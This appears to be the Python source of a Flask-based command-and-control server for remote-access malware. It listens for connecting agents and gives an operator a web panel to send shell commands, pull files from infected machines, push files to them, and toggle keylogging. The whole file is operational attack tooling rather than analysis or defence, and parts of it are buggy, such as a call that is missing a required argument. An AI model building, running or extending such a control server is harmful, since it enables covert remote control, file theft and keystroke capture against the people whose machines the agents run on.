from concurrent.futures import thread
from os import close
import socket
import threading,time,flask
from flask import *
from pathlib import Path


ip_address = '127.0.0.1'
port_number = 1236

thread_index = 0
THREADS = []
CMD_INPUT = []
CMD_OUTPUT = []
IPS = []

for i in range(20):
    #THREADS.append('')
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IPS.append('')


app = Flask(__name__)


def handle_connection(connection,address,thread_index):
    global CMD_OUTPUT
    global CMD_INPUT


    while CMD_INPUT[thread_index]!='quit':
        msg = connection.recv(1024).decode()
        CMD_OUTPUT[thread_index] = msg
        while True:
            if CMD_INPUT[thread_index]!='':
                if CMD_INPUT[thread_index].split(" ")[0]=='download':
                #download filename
                    filename = CMD_INPUT[thread_index].split(" ")[1].split("\\")[-1]
                    print(filename)
                    cmd = CMD_INPUT[thread_index]                    
                    connection.send(cmd.encode())
                    contents = connection.recv(1024*10000) #sets the file limit to 10MB
                    f = open(filename,'wb')
                    f.write(contents)
                    f.close()
                    CMD_OUTPUT[thread_index]='File Transferred Successfully'
                    CMD_INPUT[thread_index]=''
                    #break
                
                elif CMD_INPUT[thread_index].split(" ")[0]=='upload':
                    #upload filename 2048
                    cmd = CMD_INPUT[thread_index]                    
                    connection.send(cmd.encode())
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    filesize = CMD_INPUT[thread_index].split(" ")[2]
                    f = open('.\\output\\'+filename,'rb')
                    contents = f.read()
                    f.close()
                    connection.send(contents)
                    msg = connection.recv(2048).decode()
                    if msg == 'got file':
                        CMD_OUTPUT[thread_index]='File sent successfully!'
                        CMD_INPUT[thread_index]=''
                    else:
                        CMD_OUTPUT[thread_index]='Something went wrong...'
                        CMD_INPUT[thread_index]=''
                    
                elif CMD_INPUT[thread_index] == "keylog on":
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    CMD_INPUT[thread_index]=''

                elif CMD_INPUT[thread_index]=='keylog off':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    CMD_INPUT[thread_index]=''

                else:
                    msg = CMD_INPUT[thread_index]
                    connection.send(msg.encode())
                    msg = CMD_INPUT[thread_index]=''
                    break
    close_connection(connection)

def close_connection(connection,thread_index):
    connection.close()
    THREADS[thread_index]=''
    IPS[thread_index]=''
    CMD_INPUT[thread_index]=''
    CMD_OUTPUT[thread_index]=''


def server_socket():
    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.bind((ip_address,port_number))
    ss.listen(5)
    #def init_server():
    global THREADS
    global IPS
    while True:
        connection , address = ss.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_connection,args=(connection,address,len(THREADS)))
        THREADS.append(t)
        IPS.append(address)
        t.start()


@app.before_first_request
def init_server():
    s1 = threading.Thread(target=server_socket)
    s1.start()





@app.route("/")
@app.route("/home")
def home():
    return render_template('index.html')


@app.route("/agents")
def agents():
    return render_template('agents.html',threads=THREADS,ips=IPS)

@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template("execute.html",name=agentname)

@app.route("/<agentname>/execute",methods=['GET','POST'])
def execute(agentname):
    if request.method=='POST':
        cmd = request.form['command']
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        CMD_INPUT[req_index]=cmd
        time.sleep(1)
        cmdoutput = CMD_OUTPUT[req_index]
        return render_template('execute.html',cmdoutput=cmdoutput,name=agentname)

if __name__=='__main__':
    app.run(debug=True)
